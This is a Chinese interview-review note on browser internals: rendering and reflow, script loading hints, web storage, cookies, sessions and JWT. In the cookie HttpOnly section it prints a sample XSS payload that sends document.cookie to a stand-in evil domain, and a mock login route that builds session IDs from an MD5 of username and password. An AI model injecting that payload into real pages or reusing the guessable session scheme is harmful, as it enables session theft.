# 面试复习-浏览器篇

## 浏览器渲染UI的过程

1. 获取HTML文件，对HTML进行解析，并生成DOM Tree

2. 与此同时，进行css的解析，生成Style Rules

3. 接着将DOM Tree和Style Rules合成Render Tree

4. 进入布局（Layout）阶段（回流），为每个节点分配一个应出现在屏幕上的确切坐标，计算几何信息

5. 最后，通过上一步或得几何信息，调用CPU/GPU进行绘制（painting）（重绘）并展示元素

![](./浏览器渲染过程.png)

## 回流与重绘

回流：也叫重排，部分渲染树（或者整个的渲染树）需要重新分析或者尺寸需要重新计算，表现为重新生成布局，重新排列元素

重绘：由于节点的几何属性（不影响布局的属性）或者样式发生改变，例如改变元素背景颜色，表现为元素外观的改变

重排和重绘代价是高昂的，它们会破坏用户体验，并且让UI展示非常迟缓，而相比之下重排的性能影响更大，在两者无法避免的情况下，一般我们宁可选择代价更小的重绘

『重绘』不一定会出现『重排』，『重排』必然会出现『重绘』

## 何时会引发回流与重绘

* 添加或删除可见的DOM元素

* 元素的位置发生变化

* 元素的尺寸发生变化（包括外边距、内边框、边框大小、高度和宽度等）

* 内容发生变化，比如文本变化或图片被另一个不同尺寸的图片所替代。

* 页面一开始渲染的时候（这肯定避免不了）

* 浏览器的窗口尺寸变化（因为回流是根据视口的大小来计算元素的位置和大小的）

* 根据改变的范围和程度，渲染树中或大或小的部分需要重新计算，有些改变会触发整个页面的重排，比如，滚动条出现的时候或者修改了根节点。

## 如何减少回流和重绘

- 浏览器的优化机制

现代浏览器都比较聪明,由于每次重排都会造成额外的计算消耗，因此大多数浏览器都会通过队列化修改并批量执行来优化重排过程。浏览器会将修改操作放入到队列里，直到过了一段时间或者操作达到了一个阈值，才清空队列。但是！**当你获取布局信息的操作的时候，会强制队列刷新**，比如当你访问以下属性或者使用以下方法：

* offsetTop、offsetLeft、offsetWidth、offsetHeight
* scrollTop、scrollLeft、scrollWidth、scrollHeight
* clientTop、clientLeft、clientWidth、clientHeight
* getComputedStyle()
* getBoundingClientRect
* 具体可以访问这个网站：[https://gist.github.com/paulirish/5d52fb081b3570c81e3a](https://gist.github.com/paulirish/5d52fb081b3570c81e3a)

以上属性和方法都需要返回最新的布局信息，因此浏览器不得不清空队列，触发回流重绘来返回正确的值。因此，我们在修改样式的时候，**最好避免使用上面列出的属性，他们都会刷新渲染队列。**如果要使用它们，最好将值缓存起来。

- 代码优化

  1. 集中改变样式

  ```js
  <!-- 使用cssText -->
  const el = document.getElementById('test');
  el.style.cssText += 'border-left: 1px; border-right: 2px; padding: 5px;';

  <!-- 修改类名 -->
  const el = document.getElementById('test');
  el.className += ' active';
  ```

  2. 批量修改dom

  当我们需要对dom进行一系列的操作的时候,可以通过以下步骤减少回流重绘次数:

  * 使元素脱离文档流
  * 对其进行多次修改
  * 将元素带回到文档中

  该过程的第一步和第三步可能会引起回流，但是经过第一步之后，对DOM的所有修改都不会引起回流重绘，因为它已经不在渲染树了

  有三种方式可以让DOM脱离文档流：

  * 隐藏元素，应用修改，重新显示
  * 使用文档片段(document fragment)在当前DOM之外构建一个子树，再把它拷贝回文档。
  * 将原始元素拷贝到一个脱离文档的节点中，修改节点后，再替换原始的元素。

  ```js
  function appendDataToElement(appendToElement, data) {
      let li;
      for (let i = 0; i < data.length; i++) {
        li = document.createElement('li');
          li.textContent = 'text';
          appendToElement.appendChild(li);
      }
  }
  const ul = document.getElementById('list');
  ul.style.display = 'none';
  appendDataToElement(ul, data);
  ul.style.display = 'block';
  ```

  ```js
  const ul = document.getElementById('list');
  const fragment = document.createDocumentFragment();
  appendDataToElement(fragment, data);
  ul.appendChild(fragment);
  ```

  ```js
  const ul = document.getElementById('list');
  const clone = ul.cloneNode(true);
  appendDataToElement(clone, data);
  ul.parentNode.replaceChild(clone, ul);
  ```

  其实思路都是减少操作dom的次数,**但是现代浏览器会使用队列来储存多次修改，进行优化，所以对这个优化方案，我们其实不用优先考虑。**

  - 硬件加速（GPU加速）

  
  比起考虑如何减少回流重绘，我们更期望的是，根本不要回流重绘。这个时候，css3硬件加速就闪亮登场啦！！

  1. 使用css3硬件加速，可以让transform、opacity、filters这些动画不会引起回流重绘 。

  2. 对于动画的其它属性，比如background-color这些，还是会引起回流重绘的，不过它还是可以提升这些动画的性能。

  **如何触发硬件加速**

  常见的触发硬件加速的css属性：

  * transform
  * opacity
  * filters
  * Will-change

  所以我们可以通过硬编码的方式开启硬件加速, 比如

  ```css
  .example1 { transform: translateZ(0); } 
  .example2 { transform: rotateZ(360deg); }
  ```

  最好方式是使用 CSS 的 will-change 属性：

  ```css
  #target {
    will-change: transform;
  }
  ```

  **css3硬件加速的坑**

  当然，任何美好的东西都是会有对应的代价的，过犹不及。css3硬件加速还是有坑的:

  1. 如果你为太多元素使用css3硬件加速，会导致内存占用较大，会有性能问题
  2. 在GPU渲染字体会导致抗锯齿无效。这是因为GPU和CPU的算法不同。因此如果你不在动画结束的时候关闭硬件加速，会产生字体模糊

## defer和async

![](./async&&defer.webp)

defer和async属性仅适用于外部脚本，也就是只有存在src属性的时候才会生效。

async的优先级比defer高，如果同时存在defer和async属性，浏览器会选择async方式加载文件。

## preload和prefetch

在我们的浏览器加载资源的时候，对于每一个资源都有其自身的默认优先级。

以谷歌浏览器为例，我们打开控制台，并切换到Network选项，点击刷新页面，在网络下面的title一行点击鼠标右键，勾选Priority即可看到加载资源的优先级，我们可以看到样式的级别比脚本的优先级高，毕竟页面的一加载进来肯定是样式首先需要渲染的，不然整个页面便会四分五裂，用户体验不好。

![](./chrome-network-priority.webp)

通过添加preload属性可以告知浏览器应该尽快的加载某个资源

```html
<link as="script" rel="preload" href="foo.js">
```

如果提取的资源3s内未在当前使用，在谷歌开发工具将会触发警告消息

![](./chrome-preload-warning.webp)

prefetch属性可以告知浏览器页面加载完成后，在带宽可用的情况下，加载用户下一步期待的页面资源

```html
<link rel="prefetch" href="foo.html">
```

## dns-prefetch域名预解析

解析域名的时间很短，但是也会有延迟，并且不是所有的浏览器都一定会对解析后的域名进行缓存，所以，我们告知浏览器提前对域名进行预解析，并缓存

```html
<link rel="dns-prefetch" href="//domain.com">
```

## cookie、localStorage和sessionStorage

上述提到的技术名词都是在客户端以键值对存储的存储机制，并且只能将值存储为字符串

||cookie|localStorage|sessionStorage|
|---|---|---|---|
|初始化|一般由服务端通过`Set-Cookie`进行设置|客户端|客户端|
|过期时间|手动设置，比如`Expires=Wed, 21 Oct 2020 07:28:00 GMT;`或者`Max-Age=2600000;`|永不过期|当页面关闭时|
|是否会随着每个HTTP请求发送给服务器|是，cookie会通过`Cookie`请求头，自动发送给服务器|否|否|
|容量（每个域名）|4kb|5MB|5MB|
|访问权限|任意窗口|任意窗口|当前窗口|

## cookie、session、token、jwt

cookie是存储在浏览器端的一小块数据

可以通过服务端进行设置，也可以直接在浏览器端使用JavaScript进行设置

- 浏览器端：通过 js 代码来设置，例如 document.cookie = "firstName=example; 

- 服务器端：通过给 Http Response Headers 中的`Set-Cookie`字段赋值，来设置 cookie。客户端接收到Set-Cookie字段后，将其存储在浏览器中

它包含以下几个属性：

- Domain 标识指定了哪些主机可以接受 Cookie，如果指定了 Domain，则一般包含子域名（子域名可以访问父域名的 Cookie）

- Path 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 %x2F (/) 作为路径分隔符，子路径也会被匹配

  设置 Path=/docs，则以下地址都会匹配：

  /docs
  /docs/Web/
  /docs/Web/HTTP

- Expries / Max-Age Cookie 的过期时间，过了这个时间之后 Cookie 将会自动删除

  ```
  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
  
  <!-- Max-Age 的单位是秒 -->
  document.cookie = 'promo_shown=1; Max-Age=2600000; Secure'
  ```

- HttpOnly 为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 Document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记

  ```
  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
  ```

  xss攻击是指往网页中插入恶意的JavaScript脚本，达到窃取cookie值，恶意跳转引流或者其他的目的

  窃取取cookie：

  ```js
  new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie
  ```

  恶意跳转：

  ```html
  <script>
    window.location.href="http://www.baidu.com";
  </script>
  ```

- Secure 标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端

- SameSite Cookie 允许服务器要求某个 Cookie 在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）

  ```
  Set-Cookie: key=value; SameSite=Strict
  ```
  + None 浏览器会在同站请求、跨站请求下继续发送 Cookies，不区分大小写；

  + Strict 浏览器将只发送相同站点请求的 Cookie(即当前网页 URL 与请求目标 URL 完全一致)。如果请求来自与当前 location 的 URL 不同的 URL，则不包括标记为 Strict 属性的 Cookie；

  + Lax 在新版本浏览器中，为默认选项，Same-site Cookies 将会为一些跨站子请求保留，如图片加载或者 iframe 不会发送，而点击 `<a>` 标签会发送；

  |请求类型|示例|正常情况|Lax|
  |---|---|---|---|
  |链接	|`<a href="..."></a>`|发送Cookie|发送 Cookie|
  |预加载|	`<link rel="prerender" href="..."/>`|	发送 Cookie|	发送 Cookie|
  |GET 表单|	`<form method="GET" action="...">`|	发送 Cookie|	发送 Cookie|
  |POST 表单|	`<form method="POST" action="...">`|发送 Cookie|	不发送|
  |iframe	|`<iframe src="..."></iframe>`|	发送 Cookie|	不发送|
  |AJAX|	`$.get("...")`|	发送 Cookie|	不发送|
  |Image	|`<img src="...">`|	发送 Cookie	|不发送|

- 修改cookie

```js
function setCookie(cname, cvalue, exdays) {
  const d = new Date()
  d.setTime(d.getTime() + exdays * 24 * 60 * 60 * 1000)
  const expires = 'expires=' + d.toUTCString()
  return (document.cookie = cname + '=' + cvalue + ';' + expires + ';path=/')
}
```

- 删除cookie 

```js
function deleteCookie(cname) {
  const d = new Date()
  const expires = 'expires=' + d.toUTCString()
  return (document.cookie = cname + '=' + ';' + expires + ';path=/')
}
```

- 查询cookie

```js
function getCookie(cname) {
  const cookieObj = document.cookie.split(';').reduce((prev, curr) => {
    const entry = curr.split('=')
    prev[entry[0].trim()] = entry[1]
    return prev
  }, {})
  if (cname) return cookieObj[cname]
  return cookieObj
}
```

session机制是服务端的一种机制，当需要为某个客户端程序创建一个session时，服务端首先会检查该请求中是否包含session标识（session ID）。如果包含，服务端就会知道已经为改客户端创建过session，然后通过session ID检索出session的值来使用；如果不包含，就会创建一个新的session并且产生与之关联的唯一session ID，并将这个session ID返回给客户端。session ID的存储还是需要借助 cookie来实现。可以认为session是以k-v形式来存储数据的：

- Key：也称 SessionID，保存在客户端浏览器。
- Value：也称“Session”，保存在服务端。

假设/login接口登陆成功后，服务器可以生成 sessionId 和 session。其中，session 中保存了过期时间，一些冗余信息等。代码如下：

```js
router.get("/login", async (ctx, next) => {
    const { user, pwd } = querystring.parse(ctx.request.search.slice(1));
    // mock数据，模拟一下登陆过程
    if (user === "test" && pwd === "123456") {
        // 生成客户端存储的sessinId
        const sessionId = crypto
            .createHash("md5")
            .update(user + pwd)
            .digest("hex");
        // 生成服务端存储的session
        const session = {
            expire: Date.now() + 1000 * 60 * 60 * 24, // 过期时间
            info: {
                // 保存的信息
                name: user
            }
        };
        sessions.set(sessionId, session);
        ctx.cookies.set("sessionId", sessionId);
        ctx.response.body = "登陆成功";
    } else {
        ctx.response.body = "登陆失败";
        ctx.response.status = 401;
    }
});
```
然后客户端在 cookies 中携带 sessionId，访问/userInfo接口，获得用户信息。服务端检查 sessionId 合法性，以及是否过期。代码如下：

```js
router.get("/userInfo", async (ctx, next) => {
    const sessionId = ctx.cookies.get("sessionId");
    const session = sessions.get(sessionId);
    // 如果sessionId不存在
    if (!session) {
        ctx.response.body = "无法识别身份";
        ctx.response.status = 401;
        return;
    }
    // session过期
    if (session.expire <= Date.now()) {
        ctx.response.body = "session过期，请重新登陆";
        ctx.response.status = 401;
        return;
    }

    ctx.response.body = session.info;
}); 
```

session和cookie区别

- session传输数据较少，数据结构灵活，存储的数据大小无限制，取决于服务器内存；相较于 cookie 来说，session 存储在服务端，客户端仅保留换取 session 的用户凭证。因此传输数据量小，速度快。

- session 更安全：检验、生成、验证都是在服务端按照指定规则完成，而 cookie 可能被客户端通过 js 代码篡改

- session 的不足：服务器是有状态的。多台后端服务器无法共享 session。解决方法是，专门准备一台 session 服务器，关于 session 的所有操作都交给它来调用。而服务器之间的调用，可以走内网 ip，走 RPC 调用（不走 http）

token是借助算法加密形成的认证令牌。

为什么需要token？

它与cookie和session相比有以下几个优点：

- 相对cookie安全性更高，密钥存储在服务器

- 相对session而言，对于分布式的应用，不需要额外增加一台服务器专门用于共享会话状态

- 可以实现跨域授权，不在局限父子域名

缺点就是会增加服务器的压力，毕竟需要进行加密

JWT是token的一种实现标准，具体的内容可以查看 [https://jwt.io](https://jwt.io)，这里仅简单介绍以下JWT

JWT的结构或者说它包含以下几个部分：

* Header
* Payload
* Signature

header包含两部分：签名算法和token类型(JWT)

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```
上述内容通过base64编码成为JWT的header

Payload中可以自定义一些内容比如userId，官方文档也有推荐一些内容，不是强制的：

- iss: 该JWT的签发者

- sub: 该JWT所面向的用户

- aud: 接收该JWT的一方

- exp(expires): 什么时候过期，这里是一个Unix时间戳

- iat(issued at): 在什么时候签发的

比如：

```
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```
同样上述内容也需要经过base64编码

Signature 使用经过base64编码的header和payload，另外需要提供一个密钥，进行签名

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

上述使用的是 `HMACSHA256` 算法，加密后的header和payload是通过'.'进行连接的。

项目中一般会使用对应的包（比如jsonwebtoken）来进行JWT的token签发和验证，secret通常也会存储到环境变量中。

## XSS和CSRF
